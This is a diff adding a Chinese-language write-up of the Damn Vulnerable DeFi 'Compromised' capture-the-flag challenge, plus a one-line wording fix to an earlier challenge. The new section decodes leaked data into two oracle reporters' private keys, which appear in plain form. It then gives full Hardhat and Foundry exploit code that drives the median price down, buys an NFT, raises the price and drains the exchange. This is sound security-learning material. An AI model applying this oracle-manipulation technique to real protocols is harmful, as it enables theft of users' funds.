@@ -522,7 +522,7 @@ it('Execution', async function () {
     }
     ```
 
-- 创建新的 action 需要创建者获取足够的票数，票数即创建者在上一快照 `governanceToken` 的持有量
+- 创建新的 action 需要创建者获取足够的票数，票数即创建者在最新快照 `governanceToken` 的持有量
 
     ```js
     function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
@@ -634,5 +634,134 @@ function exploit() internal override {
 
     skip(governance.getActionDelay()); // 2 days
     governance.executeAction(actionId);
+}
+```
+
+## 7. Compromised
+
+> While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. Here’s a snippet:
+
+```
+HTTP/2 200 OK
+content-type: text/html
+content-language: en
+vary: Accept-Encoding
+server: cloudflare
+
+4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
+
+4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
+```
+
+> A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each.
+>
+> This price is fetched from an on-chain oracle, based on 3 trusted reporters: 0xA732...A105,0xe924...9D15 and 0x81A5...850c.
+>
+> Starting with just 0.1 ETH in balance, pass the challenge by obtaining all ETH available in the exchange.
+
+- 对返回数据先十六进制解码再 Base64 解码得到其中两个 reporter 的私钥
+- DVNFT 的价格取决于 reporters 提供价格的中位数
+
+    ```js
+    function getMedianPrice(string calldata symbol) external view returns (uint256) {
+        return _computeMedianPrice(symbol);
+    }
+
+    function _computeMedianPrice(string memory symbol) private view returns (uint256) {
+        uint256[] memory prices = getAllPricesForSymbol(symbol);
+        LibSort.insertionSort(prices);
+        if (prices.length % 2 == 0) {
+            uint256 leftPrice = prices[(prices.length / 2) - 1];
+            uint256 rightPrice = prices[prices.length / 2];
+            return (leftPrice + rightPrice) / 2;
+        } else {
+            return prices[prices.length / 2];
+        }
+    }
+
+    function getAllPricesForSymbol(string memory symbol) public view returns (uint256[] memory prices) {
+        uint256 numberOfSources = getRoleMemberCount(TRUSTED_SOURCE_ROLE);
+        prices = new uint256[](numberOfSources);
+        for (uint256 i = 0; i < numberOfSources;) {
+            address source = getRoleMember(TRUSTED_SOURCE_ROLE, i);
+            prices[i] = getPriceBySource(symbol, source);
+            unchecked { ++i; }
+        }
+    }
+
+    function getPriceBySource(string memory symbol, address source) public view returns (uint256) {
+        return _pricesBySource[source][symbol];
+    }
+    ```
+
+- 在持有两个 reporters 私钥的情况下可以很轻松地操控价格
+
+    ```js
+    function postPrice(string calldata symbol, uint256 newPrice) external onlyRole(TRUSTED_SOURCE_ROLE) {
+        _setPrice(msg.sender, symbol, newPrice);
+    }
+    ```
+
+- 先降低价格购买 NFT，再提高价格卖出
+
+### Exploit
+
+#### Hardhat
+
+```js
+it('Execution', async function () {
+    const resp = [
+        '4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35',
+        '4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34',
+    ];
+    let signers = [];
+    for (let i = 0; i < 2; i ++) {
+        signers.push(new ethers.Wallet(
+            Buffer.from(Buffer.from(resp[i].split(' ').join(''), 'hex').toString('utf8'), 'base64').toString('utf8'),
+            ethers.provider
+        ));
+        await oracle.connect(signers[i]).postPrice('DVNFT', 0);
+    }
+
+    // get tokenId from the event
+    let tx = await exchange.connect(player).buyOne({ value: 1 }); // (msg.value - price) will be send back
+    let receipt = await tx.wait();
+    let id = receipt.events.filter(
+        (x) => {return x.event == "TokenBought"}
+        )[0].args.tokenId;
+
+    for (let i = 0; i < 2; i ++) {
+        oracle.connect(signers[i]).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
+    }
+    await nftToken.connect(player).approve(exchange.address, id);
+    await exchange.connect(player).sellOne(id);
+});
+```
+
+#### Foundry
+
+```js
+function exploit() internal override {
+    address[] memory users = new address[](2);
+    users[0] = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
+    users[1] = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);
+
+    for (uint8 i = 0; i < 2; i ++) {
+        vm.prank(users[i]);
+        oracle.postPrice('DVNFT', 0);
+    }
+
+    vm.prank(attacker);
+    uint id = exchange.buyOne{ value: 1 }();
+
+    for (uint8 i = 0; i < 2; i ++) {
+        vm.prank(users[i]);
+        oracle.postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
+    }
+
+    vm.startPrank(attacker);
+    nftToken.approve(address(exchange), id);
+    exchange.sellOne(id);
+    vm.stopPrank();
 }
 ```
